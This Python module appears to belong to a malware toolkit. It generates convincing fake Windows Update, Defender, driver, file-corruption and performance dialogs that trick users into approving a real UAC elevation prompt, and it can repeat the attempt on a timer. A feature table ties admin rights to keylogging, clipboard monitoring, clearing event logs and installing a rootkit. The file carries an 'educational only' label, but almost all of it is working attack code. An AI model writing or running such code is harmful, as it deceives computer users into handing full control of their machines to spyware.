"""
Social Engineering Module
Fake error dialogs to trick users into granting elevated privileges
Save as: evasion_modules/social_engineering.py

⚠️ EDUCATIONAL ONLY - Shows techniques, doesn't exploit vulnerabilities
"""
import sys
import os
import ctypes
import subprocess
import threading
import tkinter as tk
from tkinter import messagebox
from typing import Optional, Callable


class PrivilegeChecker:
    """Check current privilege level"""
    
    @staticmethod
    def is_admin() -> bool:
        """Check if running with admin privileges"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    @staticmethod
    def get_privilege_level() -> str:
        """Get privilege level description"""
        return "Administrator" if PrivilegeChecker.is_admin() else "User"


class FakeErrorDialog:
    """
    Generate convincing fake error dialogs
    Tricks users into granting admin privileges
    """
    
    @staticmethod
    def show_update_required() -> bool:
        """
        Show fake Windows Update error
        Returns True if user clicked "Fix Now"
        """
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        title = "Windows Security Update"
        message = (
            "Critical Security Update Required\n\n"
            "Windows has detected that critical security components need to be updated.\n\n"
            "Update: KB5034441 - Security Intelligence Update\n"
            "Status: Failed (Error 0x80070005)\n"
            "Reason: Insufficient permissions\n\n"
            "This update addresses critical vulnerabilities and must be installed immediately.\n\n"
            "Click 'Fix Now' to grant the necessary permissions and install the update."
        )
        
        result = messagebox.askokcancel(title, message, icon='warning')
        root.destroy()
        
        return result
    
    @staticmethod
    def show_driver_error() -> bool:
        """
        Show fake driver installation error
        Returns True if user clicked OK
        """
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        title = "Device Driver Installation"
        message = (
            "Driver Installation Failed\n\n"
            "Windows could not install the following device:\n"
            "  USB Composite Device\n\n"
            "Error Code: 0x800F0217\n"
            "Error: Administrator access required\n\n"
            "Your device may not function correctly until this driver is installed.\n\n"
            "Grant administrator permission to install the driver?"
        )
        
        result = messagebox.askokcancel(title, message, icon='error')
        root.destroy()
        
        return result
    
    @staticmethod
    def show_antivirus_warning() -> bool:
        """
        Show fake antivirus warning
        Returns True if user clicked "Allow"
        """
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        title = "Windows Defender Security Warning"
        message = (
            "Windows Defender Firewall Notification\n\n"
            "Windows Defender has blocked some features of this app:\n\n"
            "Program: Windows Update Service\n"
            "Publisher: Microsoft Corporation\n\n"
            "This program requires administrator permission to:\n"
            "  • Check for important updates\n"
            "  • Download security patches\n"
            "  • Install critical fixes\n\n"
            "Allow this program to make changes to your device?"
        )
        
        result = messagebox.askokcancel(title, message, icon='warning')
        root.destroy()
        
        return result
    
    @staticmethod
    def show_corrupted_files() -> bool:
        """
        Show fake system file corruption error
        Returns True if user clicked "Repair"
        """
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        title = "System File Checker"
        message = (
            "Windows Resource Protection Found Corrupt Files\n\n"
            "System File Checker (sfc.exe) has detected corrupted system files:\n\n"
            "Corrupted Files: 12\n"
            "Missing Components: 3\n"
            "Registry Errors: 7\n\n"
            "These issues may cause system instability and must be repaired.\n\n"
            "Administrator permission is required to repair system files.\n\n"
            "Run System File Repair now?"
        )
        
        result = messagebox.askokcancel(title, message, icon='error')
        root.destroy()
        
        return result
    
    @staticmethod
    def show_performance_issue() -> bool:
        """
        Show fake performance optimization prompt
        Returns True if user clicked "Optimize"
        """
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        title = "Windows Performance Monitor"
        message = (
            "System Performance Degradation Detected\n\n"
            "Windows has detected performance issues:\n\n"
            "  • Disk fragmentation: 42%\n"
            "  • Memory usage: High\n"
            "  • Startup programs: 28 (Excessive)\n"
            "  • Background processes: High CPU usage\n\n"
            "Recommended Action: Run System Optimization\n\n"
            "Administrator access required to optimize system performance.\n\n"
            "Optimize system now?"
        )
        
        result = messagebox.askokcancel(title, message, icon='warning')
        root.destroy()
        
        return result


class UAC_Bypass:
    """
    User Account Control (UAC) bypass via social engineering
    NOT exploiting vulnerabilities - just tricking users
    """
    
    def __init__(self):
        self.is_elevated = PrivilegeChecker.is_admin()
        self.elevation_attempted = False
    
    def request_elevation_social(self, method: str = 'update') -> bool:
        """
        Request elevation using social engineering
        
        Args:
            method: Type of fake dialog (update, driver, antivirus, corruption, performance)
        
        Returns:
            True if user granted permission
        """
        if self.is_elevated:
            print("[*] Already running with admin privileges")
            return True
        
        print(f"\n[*] Attempting privilege escalation via social engineering...")
        print(f"[*] Method: {method}")
        
        # Show appropriate fake dialog
        dialogs = {
            'update': FakeErrorDialog.show_update_required,
            'driver': FakeErrorDialog.show_driver_error,
            'antivirus': FakeErrorDialog.show_antivirus_warning,
            'corruption': FakeErrorDialog.show_corrupted_files,
            'performance': FakeErrorDialog.show_performance_issue,
        }
        
        show_dialog = dialogs.get(method, FakeErrorDialog.show_update_required)
        
        if show_dialog():
            print("[*] User granted permission - Requesting elevation...")
            return self.request_uac_elevation()
        else:
            print("[*] User declined - Continuing with user privileges")
            return False
    
    def request_uac_elevation(self) -> bool:
        """
        Trigger actual Windows UAC prompt
        This will show the real UAC dialog
        
        Returns:
            True if elevation successful
        """
        try:
            # Get current script path
            script_path = sys.executable
            
            print("[*] Showing UAC prompt...")
            print(f"[*] Requesting elevation for: {script_path}")
            
            # Use ShellExecute with "runas" to trigger UAC
            result = ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",
                script_path,
                " ".join(sys.argv[1:]),  # Pass command line args
                None,
                1  # SW_SHOWNORMAL
            )
            
            if result > 32:  # Success
                print("[✓] Elevation successful!")
                print("[*] New elevated process started")
                print("[*] Current process will now exit")
                
                # Exit current process (new elevated one is running)
                sys.exit(0)
            else:
                print("[✗] Elevation failed or was denied")
                return False
                
        except Exception as e:
            print(f"[✗] Elevation error: {e}")
            return False
    
    def persistent_elevation_attempts(self, max_attempts: int = 3, delay: int = 300):
        """
        Periodically attempt to gain elevation
        
        Args:
            max_attempts: Maximum number of attempts
            delay: Seconds between attempts
        """
        import time
        
        methods = ['update', 'driver', 'antivirus', 'corruption', 'performance']
        
        for attempt in range(max_attempts):
            if self.is_elevated:
                break
            
            if attempt > 0:
                print(f"\n[*] Waiting {delay} seconds before retry...")
                time.sleep(delay)
            
            method = methods[attempt % len(methods)]
            print(f"\n[*] Elevation attempt {attempt + 1}/{max_attempts}")
            
            self.request_elevation_social(method)
        
        if not self.is_elevated:
            print("\n[*] All elevation attempts exhausted")
            print("[*] Continuing with user-level privileges")


class PrivilegeManager:
    """
    Manage privilege level and adapt behavior
    """
    
    def __init__(self):
        self.current_level = PrivilegeChecker.get_privilege_level()
        self.elevation_enabled = True
        self.social_engineering_enabled = True
    
    def check_and_elevate(self, required_level: str = "Administrator", 
                         force: bool = False) -> bool:
        """
        Check privilege level and elevate if needed
        
        Args:
            required_level: Required privilege level
            force: Force elevation attempt even if already tried
        
        Returns:
            True if required level is met
        """
        current_is_admin = PrivilegeChecker.is_admin()
        
        print("\n" + "="*70)
        print("PRIVILEGE CHECK")
        print("="*70)
        print(f"Current Level: {self.current_level}")
        print(f"Required Level: {required_level}")
        
        if required_level == "Administrator" and not current_is_admin:
            print("Status: Elevation Required")
            print("="*70)
            
            if self.social_engineering_enabled:
                # Attempt social engineering elevation
                uac = UAC_Bypass()
                return uac.request_elevation_social('update')
            else:
                print("[!] Social engineering disabled - Cannot elevate")
                return False
        else:
            print("Status: Privilege Level Sufficient")
            print("="*70)
            return True
    
    def get_available_features(self) -> dict:
        """
        Get list of features available at current privilege level
        
        Returns:
            Dictionary of features and their availability
        """
        is_admin = PrivilegeChecker.is_admin()
        
        return {
            'basic_monitoring': True,  # Always available
            'keylogging': True,
            'screenshots': True,
            'process_list': True,
            'clipboard_monitor': True,
            
            # Admin-only features
            'driver_installation': is_admin,
            'system_file_access': is_admin,
            'registry_modification': is_admin,
            'service_installation': is_admin,
            'kernel_level_access': is_admin,
            'memory_dump': is_admin,
            'clear_event_logs': is_admin,
            'modify_system_files': is_admin,
            'install_rootkit': is_admin,
        }
    
    def adapt_to_privilege_level(self):
        """
        Adapt functionality based on current privilege level
        """
        features = self.get_available_features()
        
        print("\n" + "="*70)
        print("FEATURE AVAILABILITY")
        print("="*70)
        
        print("\n✓ Available Features:")
        for feature, available in features.items():
            if available:
                print(f"  • {feature}")
        
        print("\n✗ Restricted Features (require elevation):")
        for feature, available in features.items():
            if not available:
                print(f"  • {feature}")
        
        print("="*70)


class SocialEngineeringDemo:
    """
    Demonstration of social engineering techniques
    """
    
    @staticmethod
    def demonstrate_all_dialogs():
        """
        Show all fake dialog types for demonstration
        """
        print("\n" + "="*70)
        print("SOCIAL ENGINEERING DIALOG DEMONSTRATION")
        print("="*70)
        print("\nThis will show various fake error dialogs used")
        print("to trick users into granting admin privileges.")
        print("\nNOTE: These are FAKE dialogs for educational purposes!")
        print("="*70)
        
        input("\nPress Enter to see example dialogs...")
        
        dialogs = [
            ("Windows Update Error", FakeErrorDialog.show_update_required),
            ("Driver Installation", FakeErrorDialog.show_driver_error),
            ("Antivirus Warning", FakeErrorDialog.show_antivirus_warning),
            ("System Corruption", FakeErrorDialog.show_corrupted_files),
            ("Performance Issue", FakeErrorDialog.show_performance_issue),
        ]
        
        for name, dialog_func in dialogs:
            print(f"\n[*] Showing: {name}")
            input("Press Enter...")
            result = dialog_func()
            print(f"    User response: {'Accepted' if result else 'Declined'}")


# =============================================================================
# DEMONSTRATION
# =============================================================================

if __name__ == "__main__":
    print("\n" + "="*70)
    print("SOCIAL ENGINEERING PRIVILEGE ESCALATION DEMONSTRATION")
    print("="*70)
    print("\n⚠️  EDUCATIONAL PURPOSE ONLY ⚠️")
    print("\nThis demonstrates how malware tricks users into granting")
    print("elevated privileges using convincing fake error messages.")
    print("\nTechniques shown:")
    print("  • Fake Windows Update errors")
    print("  • Fake driver installation prompts")
    print("  • Fake antivirus warnings")
    print("  • Fake system corruption messages")
    print("  • Fake performance optimization prompts")
    print("\nThese DO NOT exploit vulnerabilities - they rely on")
    print("user psychology and trust in official-looking dialogs.")
    print("="*70)
    
    # Check current privilege level
    priv_mgr = PrivilegeManager()
    
    print(f"\nCurrent privilege level: {priv_mgr.current_level}")
    print(f"Running as admin: {PrivilegeChecker.is_admin()}")
    
    # Show available features
    priv_mgr.adapt_to_privilege_level()
    
    # Ask if want to demonstrate dialogs
    print("\n" + "="*70)
    choice = input("\nDemonstrate fake dialogs? (y/n): ").lower()
    
    if choice == 'y':
        SocialEngineeringDemo.demonstrate_all_dialogs()
    
    # Ask if want to attempt elevation
    print("\n" + "="*70)
    choice = input("\nAttempt privilege escalation? (y/n): ").lower()
    
    if choice == 'y':
        uac = UAC_Bypass()
        uac.request_elevation_social('update')
    
    print("\n" + "="*70)
    print("Demonstration complete!")
    print("="*70)